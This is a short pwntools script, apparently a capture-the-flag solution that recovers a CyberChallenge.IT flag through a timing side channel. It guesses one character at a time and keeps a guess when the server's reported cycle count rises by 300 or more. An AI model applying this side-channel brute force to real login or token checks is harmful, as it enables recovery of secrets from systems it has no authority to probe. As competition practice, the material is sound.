from pwn import *

host = "benchmark.challs.cyberchallenge.it"
port = 9031
connection = remote(host, port)

flag = "CCIT{"
alphabet = "_" + string.digits + string.ascii_lowercase + string.punctuation + string.ascii_uppercase
c = ""
actual_cycle = 2131

while c!="}":

	for c in alphabet:

		connection.recvuntil(b"check:")
		msg = flag + c
		connection.sendline(msg.encode())
		print(f"Trying: {flag+c} ")

		connection.recvuntil(b"in ")
		cycle = connection.recvline().strip().split()[0].decode()
		cycle = int(cycle)
		print(f"{cycle}\n")

		if cycle >= actual_cycle + 300:
			flag = flag +c
			actual_cycle = cycle
			print(flag)
			break

connection.close()
print(f"\n\nflag: {flag}\n")
exit(1)
